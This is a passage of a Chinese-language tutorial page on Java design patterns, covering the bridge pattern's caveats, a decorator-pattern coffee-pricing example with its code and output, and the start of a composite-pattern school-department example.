class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-code"> 小米手机开机 </span><br><span class="hljs-code"> 折叠样式手机 </span><br><span class="hljs-code"> 小米手机打电话 </span><br><span class="hljs-code"> 折叠样式手机 </span><br><span class="hljs-code"> 小米手机关机 </span><br><span class="hljs-section"> 折叠样式手机 </span><br><span class="hljs-section">++++++++++++++++++++++</span><br><span class="hljs-code"> Vivo手机开机 </span><br><span class="hljs-code"> 折叠样式手机 </span><br><span class="hljs-code"> Vivo手机打电话 </span><br><span class="hljs-code"> 折叠样式手机 </span><br><span class="hljs-code"> Vivo手机关机 </span><br><span class="hljs-section"> 折叠样式手机 </span><br><span class="hljs-section">++++++++++++++</span><br><span class="hljs-code"> 小米手机开机 </span><br><span class="hljs-code"> 直立样式手机 </span><br><span class="hljs-code"> 小米手机打电话 </span><br><span class="hljs-code"> 直立样式手机 </span><br><span class="hljs-code"> 小米手机关机 </span><br><span class="hljs-section"> 直立样式手机 </span><br><span class="hljs-section">++++++++++++++</span><br><span class="hljs-code"> Vivo手机开机 </span><br><span class="hljs-code"> 直立样式手机 </span><br><span class="hljs-code"> Vivo手机打电话 </span><br><span class="hljs-code"> 直立样式手机 </span><br><span class="hljs-code"> Vivo手机关机 </span><br><span class="hljs-section"> 直立样式手机 </span><br><span class="hljs-section">++++++++++++++</span><br><span class="hljs-code"> 苹果开机</span><br><span class="hljs-code"> 折叠样式手机 </span><br><span class="hljs-code"> 苹果打电话</span><br><span class="hljs-code"> 折叠样式手机 </span><br><span class="hljs-code"> 苹果关机</span><br><span class="hljs-section"> 折叠样式手机 </span><br><span class="hljs-section">++++++++++++++</span><br><span class="hljs-code"> 苹果开机</span><br><span class="hljs-code"> 直立样式手机 </span><br><span class="hljs-code"> 苹果打电话</span><br><span class="hljs-code"> 直立样式手机 </span><br><span class="hljs-code"> 苹果关机</span><br><span class="hljs-section"> 直立样式手机 </span><br><span class="hljs-section">++++++++++++++</span><br><span class="hljs-code"> 小米手机开机 </span><br><span class="hljs-code"> 旋转样式手机 </span><br><span class="hljs-code"> 小米手机打电话 </span><br><span class="hljs-code"> 旋转样式手机 </span><br><span class="hljs-code"> 小米手机关机 </span><br><span class="hljs-section"> 旋转样式手机 </span><br><span class="hljs-section">++++++++++++++</span><br></code></pre></td></tr></table></figure><p>新的类图</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230102151322485.png" alt="image-20230102151322485" /></p><h3 id="桥接模式的注意事项和细节"><a class="markdownIt-Anchor" href="#桥接模式的注意事项和细节"></a> 桥接模式的注意事项和细节</h3><ol><li><p>实现了抽象和实现部分的分离，从而极大的提供了系统的灵活性，让抽象部分和实现部分独立开来，这有助于系统进行分层设计，从而产生更好的结构化系统。</p></li><li><p>对于系统的高层部分，只需要知道抽象部分和实现部分的接口就可以了，其它的部分由具体业务来完成。</p></li><li><p><strong>桥接模式替代多层继承方案</strong>，可以减少<strong>子类的个数</strong>，降低系统的管理和维护成本</p></li><li><p>桥接模式的引入增加了系统的理解和设计难度，由于聚合关联关系建立在抽象层，要求开发者针对抽象进行设计和编程</p></li><li><p>桥接模式要求<strong>正确识别出系统中两个独立变化的维度(抽象、和实现)</strong>，因此其使用范围有一定的局限性，即需要有这样的应用场景。</p></li><li><p>桥接模式其它应用场景对于那些不希望使用继承或因为多层次继承导致系统类的个数急剧增加的系统，桥接模式尤为适用</p></li></ol><h1 id="装饰器模式"><a class="markdownIt-Anchor" href="#装饰器模式"></a> <mark>装饰器模式</mark></h1><p>装饰器模式（DecoratorPattern）允许向一个现有的对象添加新的功能，同时又不改变其结构。这种类型的设计模式属于结构型模式，它是作为现有的类的一个包装。</p><p>这种模式创建了一个装饰类，用来包装原有的类，并在保持类方法签名完整性的前提下，提供了额外的功能。</p><h2 id="介绍-7"><a class="markdownIt-Anchor" href="#介绍-7"></a> 介绍</h2><p><strong>意图：</strong> 动态地给一个对象添加一些额外的职责。就增加功能来说，装饰器模式相比生成子类更为灵活。</p><p><strong>主要解决：</strong> 一般的，我们为了扩展一个类经常使用继承方式实现，由于继承为类引入静态特征，并且随着扩展功能的增多，子类会很膨胀。</p><p><strong>何时使用：</strong> 在不想增加很多子类的情况下扩展类。</p><p><strong>如何解决：</strong> 将具体功能职责划分，同时继承装饰者模式。</p><p><strong>关键代码：</strong> 1、Component 类充当抽象角色，不应该具体实现。 2、修饰类引用和继承 Component 类，具体扩展类重写父类方法。</p><p><strong>应用实例：</strong> 1、孙悟空有 72 变，当他变成&quot;庙宇&quot;后，他的根本还是一只猴子，但是他又有了庙宇的功能。<br />2、不论一幅画有没有画框都可以挂在墙上，但是通常都是有画框的，并且实际上是画框被挂在墙上。在挂在墙上之前，画可以被蒙上玻璃，装到框子里；这时画、玻璃和画框形成了一个物体。</p><p><strong>优点：</strong> 装饰类和被装饰类可以独立发展，不会相互耦合，装饰模式是继承的一个替代模式，装饰模式可以动态扩展一个实现类的功能。</p><p><strong>缺点：</strong> 多层装饰比较复杂。</p><p><strong>使用场景：</strong> 1、扩展一个类的功能。 2、动态增加功能，动态撤销。</p><p><strong>注意事项：</strong> 可代替继承。</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230102172346775.png" alt="image-20230102172346775" /></p><p>初看上图感觉装饰器模式有点像俄罗斯套娃，⽽装饰器的核⼼就是再不改原有类的基础上给类新增功能。<strong>不改变原有类</strong>，可能有的⼩伙伴会想到继承、AOP切⾯，当然这些⽅式都可以实现，但是使⽤装饰器模式会是另外⼀种思路更为灵活，可以避免继承导致的⼦类过多，也可以避免AOP带来的复杂性。</p><h2 id="实现-5"><a class="markdownIt-Anchor" href="#实现-5"></a> 实现</h2><p>星巴克咖啡订单项目（咖啡馆）：</p><ol><li><p>咖啡种类/单品咖啡：Espresso(意大利浓咖啡)、ShortBlack、LongBlack(美式咖啡)、Decaf(无因咖啡)。</p></li><li><p>调料：Milk、Soy(豆浆)、Chocolate。</p></li><li><p>要求在扩展新的咖啡种类时，具有良好的扩展性、改动方便、维护方便。</p></li><li><p>使用 OO 的来计算不同种类咖啡的费用: 客户可以点单品咖啡，也可以单品咖啡+调料组合。</p></li></ol><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230102173756821.png" alt="image-20230102173756821" /></p><p>一部分代码</p><p><code>Drink</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.decorator;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Drink</span> &#123;<br><br>    <span class="hljs-keyword">public</span> String des; <span class="hljs-comment">// 描述</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-type">float</span> <span class="hljs-variable">price</span> <span class="hljs-operator">=</span> <span class="hljs-number">0.0f</span>;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getDes</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> des;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setDes</span><span class="hljs-params">(String des)</span> &#123;<br>        <span class="hljs-built_in">this</span>.des = des;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">float</span> <span class="hljs-title function_">getPrice</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> price;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setPrice</span><span class="hljs-params">(<span class="hljs-type">float</span> price)</span> &#123;<br>        <span class="hljs-built_in">this</span>.price = price;<br>    &#125;<br><br>    <span class="hljs-comment">//计算费用的抽象方法</span><br>    <span class="hljs-comment">//子类来实现</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-type">float</span> <span class="hljs-title function_">cost</span><span class="hljs-params">()</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>Coffee</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.decorator;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Coffee</span>  <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Drink</span> &#123;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-type">float</span> <span class="hljs-title function_">cost</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.getPrice();<br>   &#125;<br><br>   <br>&#125;<br></code></pre></td></tr></table></figure><p><code>LongBlack</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.decorator;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LongBlack</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Coffee</span> &#123;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">LongBlack</span><span class="hljs-params">()</span> &#123;<br>      setDes(<span class="hljs-string">&quot; longblack &quot;</span>);<br>      setPrice(<span class="hljs-number">5.0f</span>);<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>DeCaf</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.decorator;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DeCaf</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Coffee</span> &#123;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">DeCaf</span><span class="hljs-params">()</span> &#123;<br>      setDes(<span class="hljs-string">&quot; 无因咖啡 &quot;</span>);<br>      setPrice(<span class="hljs-number">1.0f</span>);<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>Decorator</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.decorator;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Decorator</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Drink</span> &#123;<br>    <span class="hljs-keyword">private</span> Drink obj;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Decorator</span><span class="hljs-params">(Drink obj)</span> &#123; <span class="hljs-comment">//组合</span><br>        <span class="hljs-comment">// TODO Auto-generated constructor stub</span><br>        <span class="hljs-built_in">this</span>.obj = obj;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">float</span> <span class="hljs-title function_">cost</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-comment">// TODO Auto-generated method stub</span><br>        <span class="hljs-comment">// getPrice 自己价格</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.getPrice() + obj.cost();<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getDes</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-comment">// TODO Auto-generated method stub</span><br>        <span class="hljs-comment">// obj.getDes() 输出被装饰者的信息</span><br>        <span class="hljs-keyword">return</span> des + <span class="hljs-string">&quot; &quot;</span> + getPrice() + <span class="hljs-string">&quot; &amp;&amp; &quot;</span> + obj.getDes();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>Milk</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.decorator;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Milk</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Decorator</span> &#123;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">Milk</span><span class="hljs-params">(Drink obj)</span> &#123;<br>      <span class="hljs-built_in">super</span>(obj);<br>      <span class="hljs-comment">// TODO Auto-generated constructor stub</span><br>      setDes(<span class="hljs-string">&quot; 牛奶 &quot;</span>);<br>      setPrice(<span class="hljs-number">2.0f</span>); <br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>Chocolate</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.decorator;<br><br><span class="hljs-comment">//具体的Decorator， 这里就是调味品</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Chocolate</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Decorator</span> &#123;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">Chocolate</span><span class="hljs-params">(Drink obj)</span> &#123;<br>      <span class="hljs-built_in">super</span>(obj);<br>      setDes(<span class="hljs-string">&quot; 巧克力 &quot;</span>);<br>      setPrice(<span class="hljs-number">3.0f</span>); <span class="hljs-comment">// 调味品 的价格</span><br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>CoffeeBar</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.decorator;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CoffeeBar</span> &#123;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-comment">// 装饰者模式下的订单：2份巧克力+一份牛奶的LongBlack</span><br><br>      <span class="hljs-comment">// 1. 点一份 LongBlack</span><br>      <span class="hljs-type">Drink</span> <span class="hljs-variable">order</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">LongBlack</span>();<br>      System.out.println(<span class="hljs-string">&quot;费用1=&quot;</span> + order.cost());<br>      System.out.println(<span class="hljs-string">&quot;描述=&quot;</span> + order.getDes());<br><br>      <span class="hljs-comment">// 2. order 加入一份牛奶</span><br>      order = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Milk</span>(order);<br><br>      System.out.println(<span class="hljs-string">&quot;order 加入一份牛奶 费用 =&quot;</span> + order.cost());<br>      System.out.println(<span class="hljs-string">&quot;order 加入一份牛奶 描述 = &quot;</span> + order.getDes());<br><br>      <span class="hljs-comment">// 3. order 加入一份巧克力</span><br><br>      order = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Chocolate</span>(order);<br><br>      System.out.println(<span class="hljs-string">&quot;order 加入一份牛奶 加入一份巧克力  费用 =&quot;</span> + order.cost());<br>      System.out.println(<span class="hljs-string">&quot;order 加入一份牛奶 加入一份巧克力 描述 = &quot;</span> + order.getDes());<br><br>      <span class="hljs-comment">// 3. order 加入一份巧克力</span><br><br>      order = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Chocolate</span>(order);<br><br>      System.out.println(<span class="hljs-string">&quot;order 加入一份牛奶 加入2份巧克力   费用 =&quot;</span> + order.cost());<br>      System.out.println(<span class="hljs-string">&quot;order 加入一份牛奶 加入2份巧克力 描述 = &quot;</span> + order.getDes());<br>   <br>      System.out.println(<span class="hljs-string">&quot;===========================&quot;</span>);<br>      <br>      <span class="hljs-type">Drink</span> <span class="hljs-variable">order2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DeCaf</span>();<br>      <br>      System.out.println(<span class="hljs-string">&quot;order2 无因咖啡  费用 =&quot;</span> + order2.cost());<br>      System.out.println(<span class="hljs-string">&quot;order2 无因咖啡 描述 = &quot;</span> + order2.getDes());<br>      <br>      order2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Milk</span>(order2);<br>      <br>      System.out.println(<span class="hljs-string">&quot;order2 无因咖啡 加入一份牛奶  费用 =&quot;</span> + order2.cost());<br>      System.out.println(<span class="hljs-string">&quot;order2 无因咖啡 加入一份牛奶 描述 = &quot;</span> + order2.getDes());<br><br>   <br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>执行程序，输出结果：</p></blockquote><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">费用<span class="hljs-number">1</span>=<span class="hljs-number">5.0</span><br>描述= longblack <br><span class="hljs-keyword">order</span> <span class="hljs-title">加入一份牛奶 费用 =7</span>.<span class="hljs-number">0</span><br><span class="hljs-keyword">order</span> <span class="hljs-title">加入一份牛奶 描述 =  牛奶  2</span>.<span class="hljs-number">0</span> &amp;&amp;  longblack <br><span class="hljs-keyword">order</span> <span class="hljs-title">加入一份牛奶 加入一份巧克力  费用 =10</span>.<span class="hljs-number">0</span><br><span class="hljs-keyword">order</span> <span class="hljs-title">加入一份牛奶 加入一份巧克力 描述 =  巧克力  3</span>.<span class="hljs-number">0</span> &amp;&amp;  牛奶  <span class="hljs-number">2.0</span> &amp;&amp;  longblack <br><span class="hljs-keyword">order</span> <span class="hljs-title">加入一份牛奶 加入2</span>份巧克力   费用 =<span class="hljs-number">13.0</span><br><span class="hljs-keyword">order</span> <span class="hljs-title">加入一份牛奶 加入2</span>份巧克力 描述 =  巧克力  <span class="hljs-number">3.0</span> &amp;&amp;  巧克力  <span class="hljs-number">3.0</span> &amp;&amp;  牛奶  <span class="hljs-number">2.0</span> &amp;&amp;  longblack <br>===========================<br>order2 无因咖啡  费用 =<span class="hljs-number">1.0</span><br>order2 无因咖啡 描述 =  无因咖啡 <br>order2 无因咖啡 加入一份牛奶  费用 =<span class="hljs-number">3.0</span><br>order2 无因咖啡 加入一份牛奶 描述 =  牛奶  <span class="hljs-number">2.0</span> &amp;&amp;  无因咖啡 <br></code></pre></td></tr></table></figure><h1 id="组合模式"><a class="markdownIt-Anchor" href="#组合模式"></a> 组合模式</h1><p>组合模式（CompositePattern），又叫部分整体模式，是用于把一组相似的对象当作一个单一的对象。组合模式依据树形结构来组合对象，用来表示部分以及整体层次。这种类型的设计模式属于结构型模式，它创建了对象组的树形结构。</p><p>这种模式创建了一个包含自己对象组的类。该类提供了修改相同对象组的方式。</p><h2 id="介绍-8"><a class="markdownIt-Anchor" href="#介绍-8"></a> 介绍</h2><p><strong>意图：</strong> 将对象组合成树形结构以表示&quot;部分-整体&quot;的层次结构。组合模式使得用户对单个对象和组合对象的使用具有一致性，即：组合能让客户以一致的方式处理个别对象以及组合对象。</p><p><strong>主要解决：</strong><br />它在我们树型结构的问题中，模糊了简单元素和复杂元素的概念，客户程序可以像处理简单元素一样来处理复杂元素，从而使得客户程序与复杂元素的内部结构解耦。</p><p><strong>何时使用：</strong> 1、您想表示对象的部分-整体层次结构（树形结构）。 2、您希望用户忽略组合对象与单个对象的不同，用户将统一地使用组合结构中的所有对象。</p><p><strong>如何解决：</strong> 树枝和叶子实现统一接口，树枝内部组合该接口。</p><p><strong>关键代码：</strong> 树枝内部组合该接口，并且含有内部属性 List，里面放 Component。</p><p><strong>应用实例：</strong> 1、算术表达式包括操作数、操作符和另一个操作数，其中，另一个操作数也可以是操作数、操作符和另一个操作数。 2、在 JAVA AWT 和 SWING 中，对于 Button 和 Checkbox 是树叶，Container 是树枝。</p><p><strong>优点：</strong> 1、高层模块调用简单。 2、节点自由增加。</p><p><strong>缺点：</strong> 在使用组合模式时，其叶子和树枝的声明都是实现类，而不是接口，违反了依赖倒置原则。</p><p><strong>使用场景：</strong> 部分、整体场景，如树形菜单，文件、文件夹的管理。</p><p><strong>注意事项：</strong> 定义时为具体类。</p><p><strong>组合模式原理类图：</strong></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230102185734930.png" alt="image-20230102185734930" /></p><p>对原理结构图的说明-即(组合模式的角色及职责)</p><ol><li><p><strong>Component</strong> :这是组合中对象声明接口，在适当情况下，实现所有类共有的接口默认行为,用于访问和管理Component 子部件, Component 可以是抽象类或者接口</p></li><li><p><strong>Leaf :</strong> 在组合中表示叶子节点，叶子节点没有子节点</p></li><li><p><strong>Composite</strong> :非叶子节点， 用于存储子部件， 在 Component 接口中实现 子部件的相关操作，比如增加(add),删除。</p></li></ol><h2 id="实现-6"><a class="markdownIt-Anchor" href="#实现-6"></a> 实现</h2><ol><li><p><strong>编写程序</strong>展示一个学校院系结构：需求是这样，要在一个页面中展示出学校的院系组成，一个学校有多个学院，一个学院有多个系。</p></li><li><p>思路分析和图解(类图)</p></li></ol><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230102190822334.png" alt="image-20230102190822334" /></p><p><code>OrganizationComponent</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.composite;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrganizationComponent</span> &#123;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 名字</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 说明</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">private</span> String des;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">(OrganizationComponent organizationComponent)</span> &#123;<br>        <span class="hljs-comment">//默认实现</span><br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnsupportedOperationException</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">remove</span><span class="hljs-params">(OrganizationComponent organizationComponent)</span> &#123;<br>        <span class="hljs-comment">//默认实现</span><br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnsupportedOperationException</span>();<br>    &#125;<br><br>    <span class="hljs-comment">//构造器</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">OrganizationComponent</span><span class="hljs-params">(String name, String des)</span> &#123;<br>        <span class="hljs-built_in">super</span>();<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.des = des;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getDes</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> des;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setDes</span><span class="hljs-params">(String des)</span> &#123;<br>        <span class="hljs-built_in">this</span>.des = des;<br>    &#125;<br><br>    <span class="hljs-comment">//方法print, 做成抽象的, 子类都需要实现</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">print</span><span class="hljs-params">()</span>;<br><br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>Department</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.composite;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Department</span> <span class="hljs-keyword">extends</span> <span class="hljs-title 